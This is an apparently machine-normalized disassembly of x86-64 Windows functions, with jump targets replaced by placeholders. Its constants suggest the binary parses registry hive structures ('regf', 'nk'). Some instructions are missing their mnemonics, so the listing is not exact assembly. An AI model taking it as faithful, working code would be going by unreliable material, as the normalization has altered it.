cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_14003a8c0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
jmp r-xdata
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_14003a8c0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
jmp r-xdata
sub_140004aa0
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x8
call sub_1400382b4
nop
mov ecx 0x8
call sub_14003ac60
mov rdi rax
xor ebp ebp
test rax rax
je r-xdata
mov rdi rbp
call sub_1400380d8
mov [ rdi ] rax
call sub_140037e88
mov rsi rax
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_14003825c
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x58 ]
call sub_14003828c
jmp r-xdata
inc rcx
mov [ rsi + 0x8 ] rcx
mov [ rbx + 0x68 ] rdi
lea rax [ rbx + 0x10 ]
mov [ rbx + 0x20 ] rax
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
mov [ rcx ] rbp
mov rax [ rbx + 0x48 ]
mov [ rax ] rbp
mov rax [ rbx + 0x60 ]
mov [ rax ] ebp
mov rax [ rbx + 0x20 ]
mov [ rax ] rbp
mov rax [ rbx + 0x40 ]
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
mov [ rax ] ebp
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
sub_140004b90
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov eax [ rcx + 0x78 ]
mov rsi r8
mov rbp rdx
and eax 0x6
mov rbx rcx
cmp al 0x6
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
retn
mov rcx r8
mov [ rsp + 0x30 ] rdi
call sub_140002750
add rsi rsi
mov rdx rbp
mov rcx rax
mov r8 rsi
mov rdi rax
call sub_14003a8c0
test [ rbx + 0x78 ] 0x4
lea r11 [ rsi + rdi ]
mov [ rbx + 0x70 ] r11
jne r-xdata
mov eax [ rbx + 0x78 ]
test al 0x2
jne r-xdata
mov rcx [ rbx + 0x20 ]
mov [ rcx ] rdi
mov rcx [ rbx + 0x40 ]
mov [ rcx ] rdi
mov rax [ rbx + 0x58 ]
mov rcx rsi
sar rcx 0x1
mov [ rax ] ecx
or [ rbx + 0x78 ] 0x1
mov rdi [ rsp + 0x30 ]
test al 0x10
mov rax [ rbx + 0x28 ]
mov rcx rdi
mov [ rax ] rdi
mov rax [ rbx + 0x48 ]
cmovne rcx r11
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
sub rsi rcx
add rsi rdi
sar rsi 0x1
mov [ rax ] esi
mov rax [ rbx + 0x40 ]
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x20 ]
mov [ rax ] rdi
mov rax [ rbx + 0x40 ]
sar rdi 0x1
mov [ rax ] 0x0
mov rax [ rbx + 0x58 ]
mov [ rax ] edi
sub_140004c70
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movzx esi r8b
mov rbx rdx
mov rdi rcx
call sub_140003290
mov dl 0x20
mov rcx rdi
mov [ rdi + 0x48 ] rbx
mov [ rdi + 0x50 ] 0x0
call sub_140004ce0
cmp [ rdi + 0x48 ] 0x0
mov [ rdi + 0x58 ] ax
jne r-xdata
test sil sil
je r-xdata
mov edx [ rdi + 0x10 ]
xor r8d r8d
mov rcx rdi
or edx 0x4
call sub_140003120
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call sub_140037c94
sub_140004ce0
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
movzx ebp dl
lea rdx [ rsp + 0x68 ]
call sub_140003240
nop
mov rcx rax
call sub_140004d80
mov rsi rax
mov rdi [ rsp + 0x68 ]
test rdi rdi
je r-xdata
mov rax [ rsi ]
movzx edx bpl
mov rcx rsi
call [ rax + 0x50 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x60 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_140004d80
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_140002b60
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_140004ed0
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov r15 rdx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0xa0 ] ebx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r14 [ rcx - 0x1 ]
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi r14
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub rdi r14
jmp r-xdata
mov rcx [ rsi ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x40 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r13 rsi
mov [ rsp + 0x38 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rsi
lea rdx [ rsp + 0x20 ]
call sub_140003240
nop
mov rcx rax
call sub_140004d80
mov [ rsp + 0x28 ] rax
mov r12 [ rsp + 0x20 ]
test r12 r12
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_1400103c0
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
mov r13d 0xffff
cmp eax 0x40
je r-xdata
xor edx edx
lea rcx [ rsp + 0xa8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov r12d 0x4
nop [ rax + rax ] eax
nop [ rax ] eax
xor r13d r13d
cmp [ r12 + 0x8 ] r13
cmove r13 r12
lea rcx [ rsp + 0xa8 ]
call sub_14003828c
test r13 r13
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
test r14 r14
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ r13 ]
mov edx 0x1
mov rcx r13
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
mov rax [ r13 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r13 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r13
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov r13 [ rsp + 0x38 ]
test rdi rdi
jle r-xdata
mov rcx [ rsp + 0x28 ]
mov rax [ rcx ]
movzx edx [ r15 ]
call [ rax + 0x50 ]
movzx r11d ax
mov rcx [ rsi ]
movsxd rdx [ rcx + 0x4 ]
mov r8 [ rdx + rsi + 0x48 ]
mov rcx [ r8 + 0x48 ]
cmp [ rcx ] 0x0
je r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax rsi
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ r8 ]
movzx edx r11w
mov rcx r8
call [ rax + 0x18 ]
movzx r11d ax
mov rcx [ r8 + 0x60 ]
cmp [ rcx ] ebx
jle r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0xa0 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test ebx ebx
jne r-xdata
dec [ rcx ]
mov rcx [ r8 + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r11w
jmp r-xdata
test rdi rdi
jle r-xdata
cmp r13w r8w
jne r-xdata
dec rdi
jmp r-xdata
or ebx r12d
mov [ rsp + 0xa0 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r13w r11w
cmove ebx r12d
mov [ rsp + 0xa0 ] ebx
dec r14
inc r15
jmp r-xdata
cmp r13w r8w
jne r-xdata
sub_140005200
mov r11 rsp
push rdi
push r12
push r13
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 rcx
xor r13d r13d
mov [ r11 - 0x68 ] r13
lea rdx [ r11 - 0x68 ]
lea rcx [ r11 - 0x60 ]
call [ rw-data ]
test eax eax
sete bpl
test bpl bpl
je r-xdata
movzx eax bpl
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
mov ebx r13d
mov rcx [ rsp + 0x20 ]
cmp [ rcx ] ebx
jbe r-xdata
call [ rw-data ]
mov esi r13d
nop [ rax + rax ] ax
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x38 ] r13w
inc ebx
add rsi 0x8
mov rcx [ rsp + 0x20 ]
cmp ebx [ rcx ]
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
mov rax [ rcx + 0x8 ]
mov rdx [ rsi + rax ]
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x38 ] r13w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x38 ]
call sub_140001ea0
nop
lea rdx [ rsp + 0x38 ]
mov rcx r12
call sub_140003b30
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
sub_140005320
push rbp
push rsi
push rdi
sub rsp 0x80
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ rsp + 0xb0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
movzx edi dl
mov rsi rcx
xor ebp ebp
mov [ rsp + 0x40 ] rbp
xor r8d r8d
xor edx edx
lea rcx [ rsp + 0x30 ]
call [ rw-data ]
test eax eax
jne r-xdata
xor al al
neg dil
sbb ebx ebx
and ebx 0x20
mov [ rsp + 0x20 ] ebx
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0x38 ]
xor edx edx
mov rcx [ rsp + 0x30 ]
call [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x8009002a
sete dil
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
nop [ rax + rax ] eax
mov rcx [ rsp + 0x30 ]
call [ rw-data ]
movzx eax dil
jmp r-xdata
call [ rw-data ]
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbp
mov [ rsp + 0x50 ] bp
mov rcx [ rsp + 0x38 ]
call [ rw-data ]
mov [ rsp + 0x20 ] ebx
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0x38 ]
xor edx edx
mov rcx [ rsp + 0x30 ]
call [ rw-data ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_14003ad04
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0x80
pop rdi
pop rsi
pop rbp
retn
mov rax [ rsp + 0x38 ]
mov rdx [ rax ]
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbp
mov [ rsp + 0x50 ] bp
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x50 ]
call sub_140001ea0
nop
lea rdx [ rsp + 0x50 ]
mov rcx rsi
call sub_140003b30
nop
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
sub_140005490
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov rdx rcx
lea r8 [ r--data ]
lea rcx [ rsp + 0x40 ]
xor dil dil
call sub_14003ae24
test eax eax
jne r-xdata
movzx eax dil
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rsp + 0x40 ]
lea r8d [ rax + 0x2 ]
xor edx edx
call sub_14003b5e0
test eax eax
jne r-xdata
mov rcx [ rsp + 0x40 ]
call sub_14003b6d8
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rbx
call sub_14003b4d4
mov ecx eax
mov ebx eax
call j_sub_14003ac60
mov rcx [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov [ rsi ] rax
call sub_14003b5e0
mov r9 [ rsp + 0x40 ]
mov rcx [ rsi ]
mov r8d 0x1
mov edx ebx
call sub_14003b2fc
mov rbx [ rsp + 0x30 ]
cmp rax 0x1
jne r-xdata
mov rax [ rsi ]
cmp [ rax ] 0x66676572
sete dil
sub_140005540
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov r12 rcx
mov ecx 0x8
movsxd rdi r8d
mov r14 rdx
call sub_14003ae78
mov ecx 0x58
mov r15 rax
call sub_14003ae78
mov ecx 0x10
mov r13 rax
call sub_14003ae78
xor ebx ebx
mov rbp rax
mov rax [ r12 ]
mov rcx [ rax + rdi + 0x4 ]
mov [ rbp ] rcx
mov rcx [ rax + rdi + 0xc ]
mov [ rbp + 0x8 ] rcx
mov rcx [ r12 ]
lea rdx [ rcx + rdi + 0x8 ]
mov [ rbp + 0x8 ] rdx
cmp bx [ rbp + 0x2 ]
jge r-xdata
mov rcx r13
call sub_14003ad04
mov rcx rbp
call sub_14003ad04
or eax 0xffffffff
mov esi ebx
movsx eax [ rbp + 0x2 ]
inc ebx
add rsi 0x8
cmp ebx eax
jge r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r14
[ rdi ]
not rcx
dec rcx
cmp rcx r12
je r-xdata
mov r12 [ rsp + 0x50 ]
jmp r-xdata
mov rcx r13
call sub_14003ad04
mov rcx rbp
call sub_14003ad04
mov eax [ r15 ]
jmp r-xdata
mov rax [ rbp + 0x8 ]
mov r8d 0x58
mov rcx [ rsi + rax ]
mov [ r15 ] rcx
lea eax [ rcx + 0x1000 ]
mov rcx r13
movsxd rdi eax
mov rax [ r12 ]
lea rdx [ rax + rdi + 0x4 ]
call sub_14003a8c0
mov rdx [ r12 ]
movsx r12 [ r13 + 0x48 ]
lea rdx [ rdx + rdi + 0x50 ]
mov r8 r12
mov rcx r14
mov [ r13 + 0x50 ] rdx
call sub_14003d8f0
test eax eax
jne r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_140005680
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rcx
mov ecx 0x58
mov rsi rdx
xor dil dil
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
xor edx edx
mov rcx rax
lea r8d [ rdx + 0x58 ]
call sub_14003d760
jmp r-xdata
mov rcx rbx
call j_sub_14003ad04
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
movzx eax dil
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x2 ] 0x2c
jne r-xdata
mov rdx [ rbp ]
mov rcx rbx
mov r8d 0x58
add rdx 0x1024
call sub_14003a8c0
mov rdx [ rbp ]
mov eax 0x6b6e
add rdx 0x1070
mov [ rbx + 0x50 ] rdx
cmp [ rbx ] ax
jne r-xdata
movsx r8 [ rbx + 0x48 ]
mov rcx rsi
call sub_140005c90
mov dil 0x1
sub_140005730
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rdi
push r12
push r14
sub rsp 0x20
mov rbp rcx
mov ecx 0x58
mov r14 r8
mov rbx rdx
xor r12b r12b
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
xor edi edi
xor edx edx
mov rcx rax
lea r8d [ rdx + 0x58 ]
call sub_14003d760
jmp r-xdata
mov rcx rdi
call j_sub_14003ad04
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
movzx eax r12b
add rsp 0x20
pop r14
pop r12
pop rdi
retn
cmp [ rdi + 0x2 ] 0x2c
jne r-xdata
mov rdx [ rbp ]
mov rcx rdi
mov r8d 0x58
add rdx 0x1024
call sub_14003a8c0
mov rax [ rbp ]
add rax 0x1070
mov [ rdi + 0x50 ] rax
mov eax 0x6b6e
cmp [ rdi ] ax
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
mov [ rsp + 0x48 ] r13
jb r-xdata
mov rcx rbx
call sub_140055604
lea rdx [ r--data ]
mov rcx rax
mov r13 rax
call sub_14003af30
movsx r8 [ rdi + 0x48 ]
mov rdx [ rdi + 0x50 ]
mov rcx rax
call sub_14003d8f0
test eax eax
jne r-xdata
mov rbx [ rbx ]
mov rcx r13
call sub_14003ad04
mov r13 [ rsp + 0x48 ]
lea rdx [ r--data ]
xor ecx ecx
mov [ rsp + 0x40 ] rsi
call sub_14003af30
mov rbx rax
test rax rax
je r-xdata
mov rcx [ r14 ]
mov rdx rdi
mov r8d 0x58
call sub_14003a8c0
mov r12b 0x1
mov r8d [ rdi + 0x1c ]
mov rdx rbx
mov rcx rbp
add r8d 0x1000
call sub_140005540
mov esi eax
cmp eax 0xffffffff
je r-xdata
test rbx rbx
jne r-xdata
add eax 0x1000
mov rcx rdi
mov r8d 0x58
movsxd rbx eax
mov rax [ rbp ]
lea rdx [ rax + rbx + 0x4 ]
call sub_14003a8c0
mov r11 [ rbp ]
lea rdx [ r--data ]
lea rax [ r11 + rbx + 0x50 ]
xor ecx ecx
mov [ rdi + 0x50 ] rax
call sub_14003af30
mov rbx rax
test rax rax
jne r-xdata
mov rsi [ rsp + 0x40 ]
cmp esi 0x1
je r-xdata
jmp r-xdata
sub_1400058d0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x10 ] rdx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x28
mov r15 rcx
mov ecx 0x20
mov r12 r8
mov r13 rdx
xor r14b r14b
call sub_14003ac60
xor esi esi
mov rdi rax
test rax rax
je r-xdata
mov rdi rsi
xor eax eax
mov [ rdi ] rax
mov [ rdi + 0x8 ] rax
mov [ rdi + 0x10 ] rax
mov [ rdi + 0x18 ] rax
jmp r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_14003ad04#2
mov rcx rdi
call j_sub_14003ad04
movzx eax r14b
add rsp 0x28
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x20 ] rbp
mov rbp [ rsp + 0x60 ]
nop [ rax + rax ] ax
mov ecx [ r12 + 0x24 ]
mov eax 0x4
mul rcx
mov rcx 0xffffffffffffffff
cmovo rax rcx
mov rcx rax
call j_sub_14003ac60
mov ecx [ r12 + 0x28 ]
movsxd r8 [ r12 + 0x24 ]
mov r9 rax
add ecx 0x1000
mov [ rsp + 0x60 ] rax
mov rax [ r15 ]
movsxd rcx ecx
shl r8 0x2
lea rdx [ rcx + rax + 0x4 ]
mov rcx r9
call sub_14003a8c0
cmp [ r12 + 0x24 ] esi
jbe r-xdata
inc esi
add rbp 0x4
cmp esi [ r12 + 0x24 ]
jae r-xdata
movsx rax [ rdi + 0x2 ]
cmp rax r13
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x20 ]
mov r13 [ rsp + 0x68 ]
jmp r-xdata
mov eax [ rdi + 0x4 ]
mov rbx [ rsp + 0x80 ]
movzx eax ax
mov ecx eax
mov [ rbx ] eax
call j_sub_14003ac60
mov rcx rax
mov rax [ rsp + 0x78 ]
mov [ rax ] rcx
movsxd rax [ rbx ]
mov r8 rax
cmp eax 0x5
jge r-xdata
mov rcx [ r15 ]
mov eax [ rbp ]
add eax 0x1000
movsxd rdx eax
mov rax [ rcx + rdx + 0x4 ]
mov [ rdi ] rax
mov rax [ rcx + rdx + 0xc ]
mov [ rdi + 0x8 ] rax
mov rax [ rcx + rdx + 0x14 ]
mov [ rdi + 0x10 ] rax
mov rax [ rcx + rdx + 0x1c ]
mov rcx [ rsp + 0x68 ]
mov [ rdi + 0x18 ] rax
mov rax [ r15 ]
lea rbx [ rax + rdx + 0x18 ]
mov [ rdi + 0x18 ] rbx
mov r13 [ r13 + 0x10 ]
call sub_140005dc0
mov rcx rax
mov r8 r13
mov rdx rbx
call sub_14003d8f0
test eax eax
jne r-xdata
mov eax [ rdi + 0x8 ]
add eax 0x1000
movsxd rdx eax
mov rax [ r15 ]
lea rdx [ rdx + rax + 0x4 ]
lea rdx [ rdi + 0x8 ]
jmp r-xdata
call sub_14003a8c0
mov r14b 0x1
sub_140005a90
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rbx r8
mov [ rsp + 0x28 ] rbx
mov r13 rdx
mov [ rsp + 0x20 ] rcx
xor esi esi
mov edi esi
lea ecx [ rsi + 0x10 ]
call sub_14003ac60
mov r12 rax
test rax rax
je r-xdata
mov r12 rsi
xor eax eax
mov [ r12 ] rax
mov [ r12 + 0x8 ] rax
jmp r-xdata
mov r15 rsi
xor edx edx
lea r8d [ rdx + 0x58 ]
mov rcx rax
call sub_14003d760
jmp r-xdata
mov ecx 0x58
call sub_14003ac60
mov r15 rax
test rax rax
je r-xdata
mov r14 rsi
xor eax eax
mov [ r14 ] rax
jmp r-xdata
mov ecx 0x8
call sub_14003ac60
mov r14 rax
test rax rax
je r-xdata
mov rcx r12
call j_sub_14003ad04
mov rcx [ rbx + 0x8 ]
cmp [ rbx ] rcx
setne al
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rbp rsi
nop [ rax + rax ] ax
cmp [ r13 + 0x14 ] esi
jle r-xdata
inc edi
add rbp 0x8
cmp edi [ r13 + 0x14 ]
jl r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
mov eax [ r13 + 0x1c ]
add eax 0x1000
movsxd rdx eax
mov r8 [ rsp + 0x20 ]
mov rcx [ r8 ]
mov rax [ rcx + rdx + 0x4 ]
mov [ r12 ] rax
mov rax [ rcx + rdx + 0xc ]
mov [ r12 + 0x8 ] rax
mov rax [ r8 ]
lea rax [ rax + rdx + 0x8 ]
mov [ r12 + 0x8 ] rax
mov rax [ rax + rbp ]
mov [ r14 ] rax
add eax 0x1000
movsxd rbx eax
mov rax [ r8 ]
mov rcx r15
lea rdx [ rax + rbx + 0x4 ]
mov r8d 0x58
call sub_14003a8c0
mov rcx [ rsp + 0x20 ]
mov r11 [ rcx ]
lea rdx [ r11 + rbx + 0x50 ]
mov [ r15 + 0x50 ] rdx
movsx r8 [ r15 + 0x48 ]
mov [ rsp + 0x50 ] 0xf
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x38 ] 0x0
lea rcx [ rsp + 0x38 ]
call sub_140005c90
nop
lea rdx [ rsp + 0x38 ]
mov rbx [ rsp + 0x28 ]
